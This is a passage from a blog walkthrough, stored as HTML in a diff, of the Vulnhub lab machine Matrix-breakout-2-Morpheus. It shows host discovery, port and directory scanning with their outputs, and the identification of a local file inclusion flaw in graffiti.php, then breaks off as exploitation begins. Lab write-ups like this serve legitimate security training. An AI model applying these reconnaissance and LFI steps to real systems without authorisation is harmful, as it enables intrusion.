@@ -1,0 +1,864 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Vulnhub Matrix-breakout-2-Morpheus - V4ler1an</title><meta name="Description" content="Vulnhub Training -- Matrix-breakout-2-Morpheus"><meta property="og:title" content="Vulnhub Matrix-breakout-2-Morpheus" />
+<meta property="og:description" content="Vulnhub Training -- Matrix-breakout-2-Morpheus" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.v4ler1an.com/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/" /><meta property="og:image" content="https://www.v4ler1an.com/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/vulnhub.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-11-12T05:57:40+08:00" />
+<meta property="article:modified_time" content="2023-11-12T06:59:40+08:00" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://www.v4ler1an.com/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/vulnhub.png" /><meta name="twitter:title" content="Vulnhub Matrix-breakout-2-Morpheus"/>
+<meta name="twitter:description" content="Vulnhub Training -- Matrix-breakout-2-Morpheus"/>
+<meta name="twitter:site" content="@YaoyaoShaw"/>
+<meta name="application-name" content="V4ler1an">
+<meta name="apple-mobile-web-app-title" content="V4ler1an"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.v4ler1an.com/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/" /><link rel="prev" href="https://www.v4ler1an.com/2023/11/vulnhub_empire_breakout/" /><link rel="next" href="https://www.v4ler1an.com/2024/01/cobalt_strike_basic_no.1/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Vulnhub Matrix-breakout-2-Morpheus",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.v4ler1an.com\/2023\/11\/vulnhub_walkthrough-matrix-breakout-2-morpheus\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/www.v4ler1an.com\/2023\/11\/vulnhub_walkthrough-matrix-breakout-2-morpheus\/vulnhub.png",
+                            "width":  700 ,
+                            "height":  434 
+                        }],"genre": "posts","keywords": "Vulnhub","wordcount":  1743 ,
+        "url": "https:\/\/www.v4ler1an.com\/2023\/11\/vulnhub_walkthrough-matrix-breakout-2-morpheus\/","datePublished": "2023-11-12T05:57:40+08:00","dateModified": "2023-11-12T06:59:40+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "https:\/\/www.v4ler1an.com\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "v4ler1an"
+            },"description": "Vulnhub Training -- Matrix-breakout-2-Morpheus"
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="V4ler1an"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/personal_logo.png"
+        data-srcset="/images/personal_logo.png, /images/personal_logo.png 1.5x, /images/personal_logo.png 2x"
+        data-sizes="auto"
+        alt="/images/personal_logo.png"
+        title="/images/personal_logo.png" />V4ler1an</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 我 </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item language" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                        <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/" selected>简体中文</option></select>
+                    </a><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="V4ler1an"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/personal_logo.png"
+        data-srcset="/images/personal_logo.png, /images/personal_logo.png 1.5x, /images/personal_logo.png 2x"
+        data-sizes="auto"
+        alt="/images/personal_logo.png"
+        title="/images/personal_logo.png" />V4ler1an</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">我</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/" selected>简体中文</option></select>
+                </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Vulnhub Matrix-breakout-2-Morpheus</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://www.v4ler1an.com" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>v4ler1an</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/web/"><i class="far fa-folder fa-fw"></i>Web</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-11-12">2023-11-12</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1743 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 4 分钟&nbsp;<span id="/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/" class="leancloud_visitors" data-flag-title="Vulnhub Matrix-breakout-2-Morpheus">
+                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
+                    </span>&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/vulnhub.png"
+        data-srcset="/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/vulnhub.png, /2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/vulnhub.png 1.5x, /2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/vulnhub.png 2x"
+        data-sizes="auto"
+        alt="/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/vulnhub.png"
+        title="Vulnhub Training -- Matrix-breakout-2-Morpheus" /></div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#knowledge">Knowledge</a></li>
+    <li><a href="#1-environment-setup">1. Environment Setup</a></li>
+    <li><a href="#2-reconnaisence">2. Reconnaisence</a>
+      <ul>
+        <li><a href="#1-ip-address">1. IP Address</a></li>
+        <li><a href="#2-port-info">2. Port Info</a></li>
+        <li><a href="#3-web-directory">3. Web Directory</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-exploit">3. Exploit</a>
+      <ul>
+        <li><a href="#1-lfi">1. LFI</a></li>
+        <li><a href="#2-upload-the-webshell">2. Upload the webshell</a></li>
+        <li><a href="#3-get-the-reverse-shell">3. Get the reverse shell</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-privilege-escalation">4. Privilege Escalation</a></li>
+    <li><a href="#attack-path">Attack Path</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Vulnhub Training Walkthrough &ndash; Matrix-breakout-2-Morpheus</p>
+<h2 id="knowledge">Knowledge</h2>
+<ul>
+<li>LFI &ndash; Local File Include</li>
+<li>LinPEAS &ndash;</li>
+<li>Dirty-Pipe CVE-2022-0847</li>
+<li>php://filter</li>
+</ul>
+<h2 id="1-environment-setup">1. Environment Setup</h2>
+<p>Download the <a href="https://download.vulnhub.com/matrix-breakout/matrix-breakout-2-morpheus.ova" target="_blank" rel="noopener noreffer">OVA file</a>, import into VMware and just run.</p>
+<h2 id="2-reconnaisence">2. Reconnaisence</h2>
+<h3 id="1-ip-address">1. IP Address</h3>
+<p>arp-scan scanner:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo arp-scan -l
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> v4ler1an:
+</span></span><span class="line"><span class="cl">Interface: eth0, type: EN10MB, MAC: 00:0c:29:9d:5b:9e, IPv4: 172.16.86.138
+</span></span><span class="line"><span class="cl">WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
+</span></span><span class="line"><span class="cl">WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
+</span></span><span class="line"><span class="cl">Starting arp-scan 1.10.0 with <span class="m">256</span> hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
+</span></span><span class="line"><span class="cl">172.16.86.1	5e:52:30:c9:b7:65	<span class="o">(</span>Unknown: locally administered<span class="o">)</span>
+</span></span><span class="line"><span class="cl">172.16.86.2	00:50:56:fd:f8:ec	<span class="o">(</span>Unknown<span class="o">)</span>
+</span></span><span class="line"><span class="cl">172.16.86.153	00:0c:29:f6:3b:cd	<span class="o">(</span>Unknown<span class="o">)</span>
+</span></span><span class="line"><span class="cl">172.16.86.254	00:50:56:ed:8a:52	<span class="o">(</span>Unknown<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">4</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
+</span></span><span class="line"><span class="cl">Ending arp-scan 1.10.0: <span class="m">256</span> hosts scanned in 2.250 seconds <span class="o">(</span>113.78 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Target IP is 172.16.86.152.</p>
+<h3 id="2-port-info">2. Port Info</h3>
+<p>Scan the port and service:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nmap -T4 -p- -sC -sV -sT -A -Pn 172.16.86.153
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-11-14 21:14 EST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 172.16.86.153
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00033s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65532</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.4p1 Debian <span class="m">5</span> <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> aa:83:c3:51:78:61:70:e5:b7:46:9f:07:c4:ba:31:e4 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.51 <span class="o">((</span>Debian<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.51 <span class="o">(</span>Debian<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Morpheus:1
+</span></span><span class="line"><span class="cl">81/tcp open  http    nginx 1.18.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-auth:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> HTTP/1.1 <span class="m">401</span> Unauthorized<span class="se">\x</span>0D
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Basic <span class="nv">realm</span><span class="o">=</span>Meeting Place
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: <span class="m">401</span> Authorization Required
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 12.33 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Port and service:</p>
+<table>
+<thead>
+<tr>
+<th>port</th>
+<th>service</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22</td>
+<td>ssh</td>
+</tr>
+<tr>
+<td>80</td>
+<td>Apache httpd 2.4.51</td>
+</tr>
+<tr>
+<td>81</td>
+<td>nginx 1.18.0</td>
+</tr>
+</tbody>
+</table>
+<p>Access the 80 webpage:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151020427.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151020427.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151020427.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151020427.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151020427.png"
+        title="image-20231115102052270" /></p>
+<p>The source of page is:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">&lt;html&gt;
+</span></span><span class="line"><span class="cl">	&lt;head&gt;&lt;title&gt;Morpheus:1&lt;/title&gt;&lt;/head&gt;
+</span></span><span class="line"><span class="cl">	&lt;body&gt;
+</span></span><span class="line"><span class="cl">		Welcome to the Boot2Root CTF, Morpheus:1.
+</span></span><span class="line"><span class="cl">		&lt;p&gt;
+</span></span><span class="line"><span class="cl">		You play Trinity, trying to investigate a computer on the 
+</span></span><span class="line"><span class="cl">		Nebuchadnezzar that Cypher has locked everyone <span class="k">else</span> out of, at least <span class="k">for</span> ssh.
+</span></span><span class="line"><span class="cl">		&lt;p&gt;
+</span></span><span class="line"><span class="cl">		Good luck!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		- @jaybeale from @inguardians
+</span></span><span class="line"><span class="cl">		&lt;p&gt;
+</span></span><span class="line"><span class="cl">		&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&#34;trinity.jpeg&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">	&lt;/body&gt;
+</span></span><span class="line"><span class="cl">&lt;/html&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The picture is normal.</p>
+<p>Access the 81 port:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151021400.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151021400.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151021400.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151021400.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151021400.png"
+        title="image-20231115102156307" /></p>
+<p>Has a login page, but we have no name and password. The username maybe is <code>Trinity</code> or <code>Cypher</code>.</p>
+<h3 id="3-web-directory">3. Web Directory</h3>
+<p>Scan the web directory:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ gobuster dir -u http://172.16.86.153 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,bak,txt,html -t <span class="nv">60</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.6
+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://172.16.86.153
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">60</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.6
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Extensions:              php,bak,txt,html
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Starting gobuster in directory enumeration <span class="nv">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">/.php                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 348<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/.html                <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/javascript           <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 319<span class="o">]</span> <span class="o">[</span>--&gt; http://172.16.86.153/javascript/<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/robots.txt           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 47<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/graffiti.txt         <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 139<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/graffiti.php         <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 451<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/.html                <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/.php                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Progress: <span class="m">1102800</span> / <span class="m">1102805</span> <span class="o">(</span>100.00%<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can find <code>robots.txt</code>, <code>graffiti.txt</code> and <code>graffiti.php</code> file, just look at it.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ curl http://172.16.86.153/robots.txt
+</span></span><span class="line"><span class="cl">There<span class="s1">&#39;s no white rabbit here.  Keep searching!
+</span></span></span><span class="line"><span class="cl"><span class="s1">                                                                              
+</span></span></span><span class="line"><span class="cl"><span class="s1">┌──(v4ler1an㉿kali)-[~/Documents/tmp]
+</span></span></span><span class="line"><span class="cl"><span class="s1">└─$ curl http://172.16.86.153/graffiti.txt
+</span></span></span><span class="line"><span class="cl"><span class="s1">Mouse here - welcome to the Nebby!
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">Make sure not to tell Morpheus about this graffiti wall.
+</span></span></span><span class="line"><span class="cl"><span class="s1">It&#39;</span>s just here to <span class="nb">let</span> us blow off some steam.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151425610.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151425610.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151425610.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151425610.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151425610.png"
+        title="image-20231115142554473" /></p>
+<p>We found a message input box.</p>
+<h2 id="3-exploit">3. Exploit</h2>
+<p>Now, let&rsquo;s test <code>graffiti.php</code> with burp:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151427316.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151427316.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151427316.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151427316.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151427316.png"
+        title="image-20231115142725188" /></p>
+<p>As we can see, when we text in message box, the server will return the <code>graffiti.txt</code> file, and what we input in message box will be accour here. So, here has a LFI vulnerability.</p>
+<h3 id="1-lfi">1. LFI</h3>
+<p>We can check out the <code>graffiti.php </code> source code with php:filter through the LFI:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151433288.png"
